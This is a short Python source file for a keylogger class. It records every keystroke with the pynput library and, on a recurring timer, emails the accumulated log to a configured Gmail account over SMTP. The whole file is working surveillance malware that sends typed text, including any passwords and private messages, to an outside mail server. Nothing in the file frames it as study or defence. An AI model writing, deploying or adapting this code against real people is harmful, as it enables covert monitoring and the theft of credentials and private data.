#!/usr/bin/env python3
'''
    Reference:
        https://pypi.org/project/pynput/
'''

import pynput.keyboard as pynput
import threading , smtplib




class Logger:
    def __init__(self, time, addr, pwd):
        self.keyLog = ""
        self.time = time
        self.address = addr
        self.password = pwd

    def send_email(self, address, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(address, password)
        server.sendmail(address, address, message)
        server.quit()
        return

    def process(self, key):
        try:
            self.keyLog = self.keyLog + str(key.char)
        except AttributeError:
            if key == key.space:
                self.keyLog = self.keyLog + " "
            else:
                self.keyLog = self.keyLog + " " + str(key) + " "
    
    def report(self):
        self.send_email(self.address, self.password, "\n\n\n" + self.keyLog)
        self.keyLog = ""
        timer = threading.Timer(self.time, self.report)
        timer.start()
        
    def start(self):
        listener= pynput.Listener(on_press = self.process)
        with listener:
            self.report()
            listener.join()


        
